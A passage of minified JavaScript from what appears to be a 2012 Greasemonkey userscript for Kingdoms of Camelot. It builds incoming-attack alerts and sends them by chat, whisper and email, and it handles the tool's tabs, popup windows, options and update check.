"+translate("Diplomacy")+": "+C+").<BR>"+translate("Troops")+": "+y;"SCOUT"==n?(h=w+A+t+h,Options.alertConfig.log&&Options.alertConfig.logscout&&!(Options.alertConfig.logfake&&g==FakePlayer)&&actionLog(F)):Options.alertConfig.attackin?(h=w+A+t+e+f+u+E+q+h,Options.alertConfig.log&&Options.alertConfig.logattack&&!(Options.alertConfig.logfake&&g==FakePlayer)&&actionLog(G)):h="";D=new Date;w=D.getHours();F=D.getMinutes(); G=D.getSeconds();z=D.getDay();v=D.getMonth();K=D.getDate();D=D.getYear();10>F&&(F="0"+F);10>G&&(G="0"+G);1900>D&&(D+=1900);10>w&&(w="0"+w);0==z&&(z=translate("Sunday"));1==z&&(z=translate("Monday"));2==z&&(z=translate("Tuesday"));3==z&&(z=translate("Wednesday"));4==z&&(z=translate("Thursday"));5==z&&(z=translate("Friday"));6==z&&(z=translate("Saturday"));0==v&&(v=translate("January"));1==v&&(v=translate("Febraury"));2==v&&(v=translate("March"));3==v&&(v=translate("April"));4==v&&(v=translate("May")); 5==v&&(v=translate("June"));6==v&&(v=translate("July"));7==v&&(v=translate("August"));8==v&&(v=translate("September"));9==v&&(v=translate("October"));10==v&&(v=translate("November"));11==v&&(v=translate("December"));w=translate("Time")+": "+(z+" "+K+" "+v+" "+D+" - "+w+":"+F+":"+G)+" %0A";w+=translate("Target")+": "+l+" %0A";w+=translate("Attacker")+": "+g+" ("+translate("Might")+": "+addCommas(H)+", "+translate("Diplomacy")+": "+C+") %0A";w+=translate("Troops")+": "+y+" %0A %0A %0A";w+=translate("Created")+ " "+translate("by")+" Tiestoale %0A";w+="http://userscripts.org/103048 %0ACopyright 2012 - Alessandro Bello";Options.MessFinale=w;l="SCOUT"==n?I+translate("SCOUTING"):I+translate("ATTACKING");Options.MessObject=l;DEBUG_TRACE&&logit("checkTower(): full Mesage:"+h);ENABLE_TEST_TAB&&Tabs.Test.addDiv(h);Options.alertConfig.EnableTow&&(d.sendtoAlly&&!Options.alertConfig.sendtoAllyFake)&&sendChat("/a "+h);d=1E3*(60*Options.alertConfig.lungaudiomin+1*Options.alertConfig.lungaudiosec);Options.alertConfig.aAudio&& ("def"==Options.FileSel?setInterval(function(){c.allarme()},16E3):setInterval(function(){c.allarme()},d),Options.Stop=!1,c.allarme());DEBUG_TRACE&&logit("Allarme Totale (millsec):"+d+" Min:"+Options.alertConfig.lungaudiomin+" Secondi:"+Options.alertConfig.lungaudiosec);Options.alertConfig.EnableTow&&Options.SendEmail&&(("me"==Options.EmailSel||"bo"==Options.EmailSel)&&c.sendreport(),("pe"==Options.EmailSel||"bo"==Options.EmailSel)&&""!=Options.Player.Player1&&c.sendreportPlayer1(),("pe"==Options.EmailSel|| "bo"==Options.EmailSel)&&""!=Options.Player.Player2&&c.sendreportPlayer2(),("pe"==Options.EmailSel||"bo"==Options.EmailSel)&&""!=Options.Player.Player3&&c.sendreportPlayer3(),("pe"==Options.EmailSel||"bo"==Options.EmailSel)&&""!=Options.Player.Player4&&c.sendreportPlayer4());Options.alertConfig.EnableTow&&(Options.alertConfig.sendasWhisper&&!Options.alertConfig.sendasWhisperFake)&&(("me"==Options.SendWhisper||"bo"==Options.SendWhisper)&&sendChat("/"+Seed.player.name+" "+h),("pe"==Options.SendWhisper|| "bo"==Options.SendWhisper)&&""!=Options.Player.Player1&&sendChat("/"+Options.Player.Player1+" "+h),("pe"==Options.SendWhisper||"bo"==Options.SendWhisper)&&""!=Options.Player.Player2&&sendChat("/"+Options.Player.Player2+" "+h),("pe"==Options.SendWhisper||"bo"==Options.SendWhisper)&&""!=Options.Player.Player3&&sendChat("/"+Options.Player.Player3+" "+h),("pe"==Options.SendWhisper||"bo"==Options.SendWhisper)&&""!=Options.Player.Player4&&sendChat("/"+Options.Player.Player4+" "+h));if("sec"==Options.TempoSel)var J= 1E3*Options.Tempo;else"min"==Options.TempoSel?J=6E4*Options.Tempo:"ore"==Options.TempoSel&&(J=36E5*Options.Tempo);Options.alertConfig.sfondo&&(document.getElementById("mainbody").style.backgroundColor="#FF5151",setTimeout(function(){document.getElementById("mainbody").style.backgroundColor="#FFFFFF"},J));Options.alertConfig.sfondoc&&(document.getElementById("mod_comm_list2").style.backgroundColor="#FF5151",setTimeout(function(){document.getElementById("mod_comm_list2").style.backgroundColor="#FFFFFF"}, J))}}}}; function getResourceProduction(a){var b=[0,0,0,0,0],c=unixTime(),d=[0,0,0,0,0],e=Seed.wilderness["city"+a],f;for(f in e){var l=parseInt(e[f].tileType);10==l||11==l?d[1]+=parseInt(e[f].tileLevel):d[l/10]+=parseInt(e[f].tileLevel)}f=0;if(l=Seed.knights["city"+a])if(l=l["knt"+Seed.leaders["city"+a].resourcefulnessKnightId])f=parseInt(l.resourcefulness),l.resourcefulnessBoostExpireUnixtime>c&&(f*=1.25);var l=1,n=parseInt(Seed.citystats["city"+a].pop[0]),e=parseInt(Seed.citystats["city"+a].pop[3]);e>n&& (l=n/e);for(e=1;5>e;e++){var n=Seed.resources["city"+a]["rec"+e],g=0;parseInt(Seed.playerEffects["r"+e+"BstExp"])>c&&(g=0.25);b[e]=parseInt(n[2]*(1+Seed.tech["tch"+e]/10+f/100+g+0.05*d[e])*l+100)}return b}function IsNumeric(a){return a-0==a&&0<a.length} var tabManager={tabList:{},currentTab:null,init:function(a){var b=tabManager,c=[];for(k in Tabs)Tabs[k].tabDisabled||(b.tabList[k]={},b.tabList[k].name=k,b.tabList[k].obj=Tabs[k],b.tabList[k].label=null!=Tabs[k].tabLabel?translate(Tabs[k].tabLabel):k,null!=Tabs[k].tabOrder?c.push([Tabs[k].tabOrder,b.tabList[k]]):c.push([1E3,b.tabList[k]]),b.tabList[k].div=document.createElement("div"));c.sort(function(a,b){return a[0]-b[0]});for(var d="<TABLE cellspacing=0 class=pcMainTab><TR>",e=0;e<c.length;e++)d+= "<TD class=spacer></td><TD class=notSel id=pctc"+c[e][1].name+" ><A><SPAN>"+c[e][1].label+"</span></a></td>";d+="<TD class=spacer width=90% align=right>"+Versione+" - "+Autore+"&nbsp;</td></tr></table>";mainPop.getTopDiv().innerHTML=d;for(k in b.tabList){null==b.currentTab&&(b.currentTab=b.tabList[k]);document.getElementById("pctc"+k).addEventListener("click",this.e_clickedTab,!1);c=b.tabList[k].div;c.style.display="none";c.style.height="100%";a.appendChild(c);try{b.tabList[k].obj.init(c)}catch(f){c.innerHTML= "INIT ERROR: "+f}}b.setTabStyle(document.getElementById("pctc"+b.currentTab.name),!0);b.currentTab.div.style.display="block"},hideTab:function(){tabManager.currentTab.obj.hide()},showTab:function(){tabManager.currentTab.obj.show()},setTabStyle:function(a,b){a.className=b?"sel":"notSel"},e_clickedTab:function(a){var b=tabManager;newTab=b.tabList[a.target.parentNode.parentNode.id.substring(4)];b.currentTab.name!=newTab.name&&(b.setTabStyle(document.getElementById("pctc"+b.currentTab.name),!1),b.setTabStyle(document.getElementById("pctc"+ newTab.name),!0),b.currentTab.obj.hide(),b.currentTab.div.style.display="none",b.currentTab=newTab,newTab.div.style.display="block");newTab.obj.show()}};function onUnload(){Options.pcWinPos=mainPop.getLocation();saveOptions()}function mouseMainTab(a){2==a.button&&(a=getClientCoords(document.getElementById("main_engagement_tabs")),mainPop.setLocation({x:a.x+4,y:a.y+a.height}))} function eventHideShow(){mainPop.toggleHide(mainPop)?(tabManager.showTab(),Options.pcWinIsOpen=!0):(tabManager.hideTab(),Options.pcWinIsOpen=!1);saveOptions()}function hideMe(){mainPop.show(!1);tabManager.hideTab();Options.pcWinIsOpen=!1;saveOptions()}function showMe(){mainPop.show(!0);tabManager.showTab();Options.pcWinIsOpen=!0;saveOptions()}function addMyFunction(a){unsafeWindow[a.name]=a} function addUwFunction(a){var b=document.createElement("script");b.innerHTML=a.toString();document.body.appendChild(b)}function alterUwFunction(a,b){try{funcText=unsafeWindow[a].toString();rt=funcText.replace("function "+a,"function");for(i=0;i<b.length;i++){x=rt.replace(b[i][0],b[i][1]);if(x==rt)return!1;rt=x}js=a+" = "+rt;var c=document.createElement("script");c.innerHTML=js;document.body.appendChild(c);return!0}catch(d){return!1}} function CdispCityPicker(a,b,c,d,e){this.selectBut=function(a){document.getElementById(this.id+"_"+a).click()};this.bindToXYboxes=function(a,b){this.coordBoxX=a;this.coordBoxY=b;var c=new function(c){this.eventChange=function(){var a=parseInt(c.coordBoxX.value,10),b=parseInt(c.coordBoxY.value,10);isNaN(a)||0>a||750<a?c.coordBoxX.style.backgroundColor="#ff8888":isNaN(b)||0>b||750<b?c.coordBoxY.style.backgroundColor="#ff8888":(c.coordBoxX.style.backgroundColor="#ffffff",c.coordBoxY.style.backgroundColor= "#ffffff",null!=c.notify&&c.notify(null,a,b))};c.city&&(a.value=c.city.x,b.value=c.city.y)}(this);a.size=2;a.maxLength=3;b.size=2;b.maxLength=3;a.addEventListener("change",c.eventChange,!1);b.addEventListener("change",c.eventChange,!1)};this.coordBoxY=this.coordBoxX=null;this.id=a;this.dispName=c;this.prefixLen=a.length+1;this.notify=d;this.city=this.selected=null;var f="";for(d=0;d<Cities.cities.length;d++)f+='<INPUT class="castleBut castleButNon" id="'+a+"_"+d+'" value="'+(d+1)+'" type=submit >'; c&&(f+=' &nbsp; <SPAN style="display:inline-block; width:85px; font-weight:bold;" id='+a+"cname></span>");b.innerHTML=f;b=new function(a){this.clickedCityBut=function(b){null!=a.selected&&(a.selected.className="castleBut castleButNon");a.city=Cities.cities[b.target.id.substr(a.prefixLen)];a.dispName&&(document.getElementById(a.id+"cname").innerHTML=a.city.name);b.target.className="castleBut castleButSel";a.selected=b.target;a.coordBoxX&&(a.coordBoxX.value=a.city.x,a.coordBoxY.value=a.city.y,a.coordBoxX.style.backgroundColor= "#ffffff",a.coordBoxY.style.backgroundColor="#ffffff");null!=a.notify&&a.notify(a.city,a.city.x,a.city.y)}}(this);for(d=0;d<Cities.cities.length;d++)document.getElementById(a+"_"+d).addEventListener("click",b.clickedCityBut,!1);null!=e&&this.selectBut(e)} function setCities(){Cities.numCities=Seed.cities.length;Cities.cities=[];Cities.byID={};for(i=0;i<Cities.numCities;i++)city={},city.idx=i,city.id=parseInt(Seed.cities[i][0]),city.name=Seed.cities[i][1],city.x=parseInt(Seed.cities[i][2]),city.y=parseInt(Seed.cities[i][3]),city.tileId=parseInt(Seed.cities[i][5]),Cities.cities[i]=city,Cities.byID[Seed.cities[i][0]]=city} function dialogRetry(a,b,c,d){function e(){document.getElementById("paretrySeconds").innerHTML=b--;0<b&&(cdTimer=setTimeout(e,1E3))}b=parseInt(b);var f=new CPoppa("pcretry",0,0,400,200,!0);f.centerMe(mainPop.getMainDiv());f.getTopDiv().innerHTML="<CENTER>KOC Power Bot</center>";f.getMainDiv().innerHTML='<CENTER><BR><FONT COLOR=#550000><B>An error has ocurred:</b></font><BR><BR><DIV id=paretryErrMsg></div><BR><BR><B>Automatically retrying in <SPAN id=paretrySeconds></b></span> seconds ...<BR><BR><INPUT id=paretryCancel type=submit value="CANCEL Retry" >'; document.getElementById("paretryCancel").addEventListener("click",function(){clearTimeout(l);clearTimeout(cdTimer);f.destroy();d()},!1);f.show(!0);document.getElementById("paretryErrMsg").innerHTML=a;document.getElementById("paretrySeconds").innerHTML=b;var l=setTimeout(function(){clearTimeout(l);clearTimeout(cdTimer);f.show(!1);c()},1E3*b);e()}function implodeUrlArgs(a){var b=[],c;for(c in a)b.push(c+"="+encodeURI(a[c]));return b.join("&")} function addUrlArgs(a,b){if(!b)return a;0>a.indexOf("?")?a+="?":"&"!=a.substr(a.length-1)&&(a+="&");return matTypeof("object"==b)?a+implodeUrlArgs(b):a+b} function AjaxRequest(a,b){var c={"X-Requested-With":"XMLHttpRequest","X-Prototype-Version":"1.6.1",Accept:"text/javascript, text/html, application/xml, text/xml, */*"},d=null,d=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP");method=null==b.method||""==b.method?"GET":b.method.toUpperCase();"POST"==method?c["Content-type"]="application/x-www-form-urlencoded; charset=UTF-8":"GET"==method&&addUrlArgs(a,b.parameters);d.onreadystatechange=function(){if(4==d.readyState){if(200<= d.status&&305>d.status)if(b.onSuccess)b.onSuccess(d);else if(b.onFailure)b.onFailure(d)}else if(b.onChange)b.onChange(d)};d.open(method,a,!0);for(var e in c)d.setRequestHeader(e,c[e]);if("object"==matTypeof(b.requestHeaders))for(e in b.requestHeaders)d.setRequestHeader(e,b.requestHeaders[e]);if("POST"==method){c=[];for(e in b.parameters)c.push(e+"="+b.parameters[e]);d.send(c.join("&"))}else d.send()} function MyAjaxRequest(a,b){DEBUG_TRACE&&logit(" 0 myAjaxRequest: "+a+"\n"+inspect(b,2,1));var c=unsafeWindow.Object.clone(b),d=b.onSuccess,e=b.onFailure,f=0,l=5,n=!0===n?!0:!1;c.onSuccess=function(b){var e=eval("("+b.responseText+")");window.EmulateAjaxError&&(e.ok=!1,e.error_code=8);if(e.ok)e.updateSeed&&unsafeWindow.update_seed(e.updateSeed),d(e);else{e.errorMsg=unsafeWindow.printLocalError(e.error_code||null,e.msg||null,e.feedback||null);if(0<(b=e.errorMsg.indexOf("<br><br>")))e.errorMsg=e.errorMsg.substr(0, b-1);!n&&(0==e.error_code||8==e.error_code||1==e.error_code||3==e.error_code)?dialogRetry(e.errorMsg,l,function(){++f;new AjaxRequest(a,c);l*=1.25},function(){d(e)}):d(e)}};c.onFailure=function(){e({ok:!1,errorMsg:"AJAX Communication Failure"})};new AjaxRequest(a,c)} function getDiplomacy(a){return null==Seed.allianceDiplomacies?translate("neutral"):Seed.allianceDiplomacies.friendly&&null!=Seed.allianceDiplomacies.friendly["a"+a]?translate("friendly"):Seed.allianceDiplomacies.hostile&&null!=Seed.allianceDiplomacies.hostile["a"+a]?translate("hostile"):translate("neutral")} function getMyAlliance(){return null==Seed.allianceDiplomacies||null==Seed.allianceDiplomacies.allianceName?[0,"None"]:[Seed.allianceDiplomacies.allianceId,Seed.allianceDiplomacies.allianceName]}function getCityBuilding(a,b){for(var c=Seed.buildings["city"+a],d={count:0,maxLevel:0},e=1;33>e;e++)c["pos"+e]&&c["pos"+e][0]==b&&(++d.count,parseInt(c["pos"+e][1])>d.maxLevel&&(d.maxLevel=parseInt(c["pos"+e][1])));return d} function GetServerId(){var a=/^[a-zA-Z]+([0-9]+)\./.exec(document.location.hostname);return a?a[1]:""}function saveOptions(){var a=getServerId();setTimeout(function(){GM_setValue("Options_"+a,JSON2.stringify(Options))},0)}function readOptions(){var a=getServerId();s=GM_getValue("Options_"+a);if(null!=s)for(k in opts=JSON2.parse(s),opts)if("object"==matTypeof(opts[k]))for(kk in opts[k])Options[k][kk]=opts[k][kk];else Options[k]=opts[k]} function logit(a){var b=GetServerId(),c=new Date;logit(b+" @ "+c.toTimeString().substring(0,8)+"."+c.getMilliseconds()+": "+a)} var debugWin={popDebug:null,dbDefaultNot:"tech,tutorial,items,quests,wilderness,wildDef,buildings,knights,allianceDiplomacies,appFriends,players",dbSelect:{},doit:function(){function a(){for(var a=document.getElementById("dbpoplist"),b=0;b<a.childNodes.length;b++)if(a.childNodes[b].type&&"checkbox"==a.childNodes[b].type){var c=a.childNodes[b].name.substr(6);a.childNodes[b].checked=f.dbSelect[c]}}function b(){for(var b in f.dbSelect)f.dbSelect[b]=!0;a()}function c(){for(var b in f.dbSelect)f.dbSelect[b]= !1;a()}function d(){for(n in f.dbSelect)f.dbSelect[n]=!0;for(var b=f.dbDefaultNot.split(","),c=0;c<b.length;c++)f.dbSelect[b[c]]=!1;a()}function e(){for(var a=new Date,b=unsafeWindow.Object.clone(Seed),c=document.getElementById("dbpoplist"),d=0;d<c.childNodes.length;d++)if(c.childNodes[d].type&&"checkbox"==c.childNodes[d].type){var e=c.childNodes[d].name.substr(6);c.childNodes[d].checked||delete b[e]}WinLog.write("seed @ "+unixTime()+" ("+a+")\n\n"+inspect(b,8,1))}var f=debugWin;if(null==f.popDebug){f.popDebug= new CPoppa("db",0,0,350,500,!0);f.popDebug.getTopDiv().innerHTML="DEBUG";f.popDebug.getMainDiv().innerHTML='<DIV><INPUT type=submit id=padbsuball value=ALL> &nbsp; <INPUT type=submit id=padbsubnone value=NONE> &nbsp; <INPUT type=submit id=padbdefaults value=DEFAULTS> &nbsp; <INPUT type=submit id=padbsubdo value=SHOW></div><DIV id=padbpoplist style="max-height:400px; height:400px; overflow-y:auto"></div>';var l=document.getElementById("padbpoplist"),n;for(n in Seed)f.dbSelect[n]=!0;for(var g=f.dbDefaultNot.split(","), u=0;u<g.length;u++)f.dbSelect[g[u]]=!1;g=[];for(n in f.dbSelect)g.push("<INPUT type=checkbox "),g.push('name="dbpop_'),g.push(n),g.push('"> &nbsp; '),g.push(n),g.push("<BR>");l.innerHTML=g.join("");document.getElementById("padbsuball").addEventListener("click",b,!1);document.getElementById("padbsubnone").addEventListener("click",c,!1);document.getElementById("padbdefaults").addEventListener("click",d,!1);document.getElementById("padbsubdo").addEventListener("click",e,!1);a()}f.popDebug.show(!0)}}; function saveOptions(){saveValue("Options",JSON2.stringify(Options),GetServerId())}function logit(a){var b=new Date;GM_log(getServerId()+" @ "+b.toTimeString().substring(0,8)+"."+b.getMilliseconds()+": "+a)}function readOptions(){var a=GetServerId();s=loadValue("Options",a);if(null!=s)for(k in opts=JSON2.parse(s),opts)Options[k]=opts[k]}function createButton(a){var b=document.createElement("a");b.className="button20";b.innerHTML='<span style="color: #ff6">'+a+"</span>";return b} function AddMainTabLink(a,b,c){a=createButton(a);a.className="tab";var d=document.getElementById("main_engagement_tabs");if(!d&&(d=document.getElementById("topnav_msg")))d=d.parentNode;if(d){for(var e=d.parentNode,f=null,l=0;l<e.childNodes.length;l++){var n=e.childNodes[l];if(n.tagName&&"DIV"==n.tagName&&"tabs_engagement"==n.className&&"main_engagement_tabs"!=n.id){f=n;break}}if(null==f||null!=f)f=document.createElement("towertiestoale"),f.className="tabs_engagement",f.style.background="#FFFFFF", d.parentNode.insertBefore(f,d),f.style.whiteSpace="nowrap",f.style.width="735px",f.lang="en_PB",GM_xmlhttpRequest({method:"GET",url:"http://userscripts.org/scripts/source/103048.meta.js",onload:function(a){a=/\/\/\s*@version\s+(.+)\s*\n/i.exec(a.responseText);Versione<a[1]&&(f.innerHTML='<a class="tab" href="http://userscripts.org/scripts/source/103048.user.js" style="float:right;margin-right:90px;"><span style="color:#FFFFFF">'+translate("Install")+" (v"+a[1]+"!)</span></a>",f.innerHTML+='<span style="float:right;margin-right:80px;margin-top:4px;font-size:16px;text-shadow: 10px 10px 10px #AAA;"><center><b>'+ translate("Install the new version of")+" "+translate(Scriptname)+"!</b></center></span>")},onerror:function(){}}),f.innerHTML+='<a target="_support" href="https://www.facebook.com/groups/koctoweralert/" class="tab"style="float:right;margin-right:15px;"><span style="color:#FF9933">'+translate("Tower Support")+"</span></a>",f.innerHTML+='<span style="float:right;margin-right:80px;margin-top:4px;font-size:16px;text-shadow: 10px 10px 10px #AAA;"><center><b>'+translate(Scriptname)+" - (v "+Versione+") by "+ Autore+"</b></center></span>",f.innerHTML+='<iframe src="" id="BOsound" frameborder=0 height=0 width=0 loop=2></iframe>';f.appendChild(a);a.addEventListener("click",b,!1);null!=c&&a.addEventListener("mousedown",c,!0);return a}return null} unsafeWindow.pcGotoMap=function(a,b){hideMe();setTimeout(function(){document.getElementById("mapXCoor").value=a;document.getElementById("mapYCoor").value=b;unsafeWindow.reCenterMapWithCoor();for(var c=document.getElementById("mod_views").getElementsByTagName("a"),d=0;d<c.length;d++)c[d].className="";document.getElementById("mod_views_map").className="sel";document.getElementById("maparea_city").style.display="none";document.getElementById("maparea_fields").style.display="none";document.getElementById("maparea_map").style.display= "block";unsafeWindow.tutorialClear()},0)}; var CalterUwFunc=function(a,b){var c=this;this.isEnabled=!1;this.isAvailable=function(){return null==c.funcNew?!1:!0};this.setEnable=function(b){if(null!=c.funcNew&&c.isEnabled!=b)if(b){var d=document.createElement("script");d.innerHTML=a+" = "+c.funcNew;document.body.appendChild(d);setTimeout(function(){document.body.removeChild(d)},0);c.isEnabled=!0}else unsafeWindow[c.funcName]=c.funcOld,c.isEnabled=!1};this.funcName=a;this.funcOld=unsafeWindow[a];this.funcNew=null;try{for(var d=unsafeWindow[a].toString().replace("function "+ a,"function"),e=0;e<b.length;e++){x=d.replace(b[e][0],b[e][1]);if(x==d)return!1;d=x}this.funcNew=d}catch(f){}};function makeButton20(a){var b=document.createElement("a");b.className="button20 ptButton20";var c=document.createElement("span");c.innerHTML=a;b.appendChild(c);return b}function strButton20(a,b){null==b&&(b="");return'<TABLE class=ptNoPad><TR><TD><A class="button20 ptButton20" '+b+"><SPAN>"+a+"</span></a></td></tr></table>"} function reloadKOC(){var a=GetServerId(),a='<FORM target="_top" action="'+(document.URL.match(/standalone=1/i)?window.location.protocol+"//www.kabam.com/kingdoms-of-camelot/play?s="+a:window.location.protocol+"//apps.facebook.com/kingdomsofcamelot/?s="+a)+'" method=get><INPUT id=xxButReload type=submit value=RELOAD></form>',b=document.createElement("div");b.innerHTML=a;document.body.appendChild(b);setTimeout(function(){document.getElementById("xxButReload").click()},0)} function htmlSelector(a,b,c){var d=[];d.push("<SELECT");c&&(d.push(" "),d.push(c));for(var e in a)d.push("><OPTION "),e==b&&d.push("SELECTED "),d.push('value="'),d.push(e),d.push('">'),d.push(a[e]),d.push("</option>");d.push("</select>");return d.join("")}function cityStatusString(a){return 4==a?"Vacation":3==a?"Truce":2==a?"Beg Protection":"Normal"}function sendChat(a){document.getElementById("mod_comm_input").value=a;unsafeWindow.Chat.sendChat()} Chat={params:null,sendWhisper:function(a,b,c){this.params=unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);this.params.ctype=3;this.params.name=b;this._sendit(a,c)},sendGlobal:function(a,b){this.params=unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);this.params.ctype=1;this._sendit(a,b)},sendAlliance:function(a,b){this.params=unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);this.params.ctype=2;this._sendit(a,b)},_sendit:function(a,b){this.params.comment=a.replace(/^\s+/,"").replace(/\s+$/, "");new MyAjaxRequest(unsafeWindow.g_ajaxpath+"ajax/sendChat.php"+unsafeWindow.g_ajaxsuffix,{method:"post",parameters:this.params,onSuccess:function(){b&&b()},onFailure:function(){b&&b()}})}};DebugTimer={startTime:0,start:function(){now=new Date;DebugTimer.startTime=now.getTime()},getMillis:function(){now=new Date;return now.getTime()-DebugTimer.startTime},display:function(a,b){now=new Date;elapsed=now.getTime()-DebugTimer.startTime;logit(a+": "+elapsed/1E3);if(null===b||!b)DebugTimer.startTime=now.getTime()}}; function debugPos(a){return"["+a.tagName+"] client - offset: "+a.clientLeft+","+a.clientTop+","+a.clientWidth+","+a.clientHeight+" - "+a.offsetLeft+","+a.offsetTop+","+a.offsetWidth+","+a.offsetHeight+" "+a+" --OP--\x3e "+a.offsetParent}function CwaitForElement(a,b,c){this.check=function(){document.getElementById(a)?c(!0):(new Date).getTime()>d.end?c(!1):setTimeout(d.check,250)};this.end=(new Date).getTime()+b;var d=this;this.check()} function clickWin(a,b,c){var d=a.document.createEvent("MouseEvents");d.initMouseEvent(c,!0,!0,a,0,0,0,0,0,!1,!1,!1,!1,0,null);return!b.dispatchEvent(d)}function debugElement(a){a=unsafeWindow.Object.clone(a.wrappedJSObject);a.innerHTML="";a.innerText="";a.textContent="";return inspect(a,1,1)} function getClientCoords(a){if(null==a)return{x:null,y:null,width:null,height:null};for(ret={x:0,y:0,width:a.clientWidth,height:a.clientHeight};null!=a.offsetParent;)ret.x+=a.offsetLeft,ret.y+=a.offsetTop,a=a.offsetParent;return ret} function DOMtree(a,b){function c(a,b,l){try{for(var n=0;n<l;n++)d.push(" ");a.tagName?d.push(a.tagName):d.push("?");a.id&&(d.push(" id="),d.push(a.id));a.name&&(d.push(" name="),d.push(a.name));a.className&&(d.push(" class="),d.push(a.className));a.style&&(a.style.display&&0<a.style.display.indexOf("none"))&&d.push(" hidden");d.push("\n");if(l<b)for(n=0;n<a.childNodes.length;n++)c(a.childNodes[n],b,l+1)}catch(g){d.push("UNAVAILBLE!\n")}}var d=[];c(a,b,0);return d.join("")} function parseIntNan(a){x=parseInt(a,10);return isNaN(x)?0:x}function parseIntZero(a){a=a.trim();return""==a?0:parseInt(a,10)}var WinManager={wins:{},get:function(a){return WinManager.wins[a]},add:function(a,b){WinManager.wins[a]=b;null==unsafeWindow.CPoppaWins&&(unsafeWindow.CPoppaWins={});unsafeWindow.CPoppaWins[a]=b},_delete:function(a){delete WinManager.wins[a];delete unsafeWindow.CPoppaWins[a]}}; function CPoppa(a,b,c,d,e,f,l){var n=WinManager.get(a);if(n)return n.show(!1),n;this.BASE_ZINDEX=111111;this.show=function(a){a?(g.div.style.display="block",g.focusMe()):g.div.style.display="none";return a};this.toggleHide=function(a){return"block"==a.div.style.display?a.show(!1):a.show(!0)};this.getTopDiv=function(){return document.getElementById(this.prefix+"_top")};this.getMainDiv=function(){return document.getElementById(this.prefix+"_main")};this.getLayer=function(){return parseInt(g.div.style.zIndex)- this.BASE_ZINDEX};this.setLayer=function(a){g.div.style.zIndex=""+(this.BASE_ZINDEX+a)};this.setEnableDrag=function(a){g.dragger.setEnable(a)};this.getLocation=function(){return{x:parseInt(this.div.style.left),y:parseInt(this.div.style.top)}};this.setLocation=function(a){g.div.style.left=a.x+"px";g.div.style.top=a.y+"px"};this.focusMe=function(){g.setLayer(5);for(k in unsafeWindow.CPoppaWins)k!=g.prefix&&unsafeWindow.CPoppaWins[k].unfocusMe()};this.unfocusMe=function(){g.setLayer(-5)};this.centerMe= function(a){var b=null==a?getClientCoords(document.body):getClientCoords(a);a=(b.width-parseInt(g.div.style.width))/2+b.x;b=(b.height-parseInt(g.div.style.height))/2+b.y;g.div.style.left=a+"px";g.div.style.top=b+"px"};this.destroy=function(){document.body.removeChild(g.div);WinManager._delete(g.prefix)};this.autoHeight=function(a){g.div.style.height=a?"":g.div.style.maxHeight};this.div=document.createElement("div");this.prefix=a;this.onClose=l;var g=this;this.div.className="CPoppa "+a+"_CPoppa";this.div.id= a+"_outer";this.div.style.background="#fff";this.div.style.zIndex=this.BASE_ZINDEX;this.div.style.display="none";this.div.style.width=d+"px";this.div.style.height=e+"px";this.div.style.maxHeight=e+"px";this.div.style.overflowY="hidden";this.div.style.position="absolute";this.div.style.top=c+"px";this.div.style.left=b+"px";topClass=null==CPoppaTopClass?"CPoppaTop "+a+"_CPoppaTop":CPoppaTopClass+" "+a+"_"+CPoppaTopClass;b='<TABLE cellspacing=0 width=100% height=100%><TR id="'+a+'_bar" class="'+topClass+ '"><TD width=99% valign=bottom><SPAN id="'+a+'_top"></span></td><TD id='+a+'_X align=right valign=middle onmouseover="this.style.cursor=\'pointer\'" style="color:#fff; background:#333; font-weight:bold; font-size:14px; padding:0px 5px">X</td></tr><TR><TD height=100% valign=top class="CPopMain '+a+'_CPopMain" colspan=2 id="'+a+'_main"></td></tr></table>';document.body.appendChild(this.div);this.div.innerHTML=b;document.getElementById(a+"_X").addEventListener("click",function(){g.show(!1);if(null!= g.onClose)g.onClose()},!1);this.dragger=new CWinDrag(document.getElementById(a+"_bar"),this.div,f);this.div.addEventListener("mousedown",function(){g.focusMe()},!1);WinManager.add(a,this)} function CWinDrag(a,b,c){function d(a){a.body.removeEventListener("mousemove",a.moveHandler,!0);a.body.removeEventListener("mouseout",a.outHandler,!0);a.moving=!1}var e=this;this.setEnable=function(b){b!=e.enabled&&(b?(a.addEventListener("mousedown",e.downHandler,!1),e.body.addEventListener("mouseup",e.upHandler,!1)):(a.removeEventListener("mousedown",e.downHandler,!1),e.body.removeEventListener("mouseup",e.upHandler,!1)),e.enabled=b)};this.setBoundRect=function(){this.boundRect=boundRect;this.bounds= null};this.debug=function(a,b){logit("*************** "+a+" ****************");logit("clientWidth, Height: "+b.clientWidth+","+b.clientHeight);logit("offsetLeft, Top, Width, Height (parent): "+b.offsetLeft+","+b.offsetTop+","+b.offsetWidth+","+b.offsetHeight+" ("+b.offsetParent+")");logit("scrollLeft, Top, Width, Height: "+b.scrollLeft+","+b.scrollTop+","+b.scrollWidth+","+b.scrollHeight)};this.dispEvent=function(a,b){logit(a+" Button:"+b.button+" Screen:"+b.screenX+","+b.screenY+" client:"+b.clientX+ ","+b.clientY+" rTarget: "+b.relatedTarget)};this.lastY=this.lastX=null;this.enabled=!0;this.moving=!1;this.theDiv=b;this.body=document.body;this.ce=a;this.moveHandler=(new function(a){this.handler=function(a){if(b.enabled&&!b.wentOut){var c=parseInt(b.theDiv.style.top)+a.clientY-b.lastY,e=parseInt(b.theDiv.style.left)+a.clientX-b.lastX;c<b.bounds.top?(c=b.bounds.top,d(b)):e<b.bounds.left?(e=b.bounds.left,d(b)):e>b.bounds.right?(e=b.bounds.right,d(b)):c>b.bounds.bot&&(c=b.bounds.bot,d(b));b.theDiv.style.top= c+"px";b.theDiv.style.left=e+"px";b.lastX=a.clientX;b.lastY=a.clientY}};var b=a}(this)).handler;this.outHandler=(new function(a){this.handler=function(a){0==a.button&&b.moveHandler(a)};var b=a}(this)).handler;this.upHandler=(new function(a){this.handler=function(a){0==a.button&&b.moving&&d(b)};var b=a}(this)).handler;this.downHandler=(new function(b){this.handler=function(b){null==c.bounds&&(c.clickableRect=getClientCoords(a),c.bodyRect=getClientCoords(document.body),null==c.boundRect&&(c.boundRect= c.clickableRect),c.bounds={top:10-c.clickableRect.height,bot:c.bodyRect.height-25,left:40-c.clickableRect.width,right:c.bodyRect.width-25});0==b.button&&c.enabled&&(c.body.addEventListener("mousemove",c.moveHandler,!0),c.body.addEventListener("mouseout",c.outHandler,!0),c.lastX=b.clientX,c.lastY=b.clientY,c.moving=!0)};var 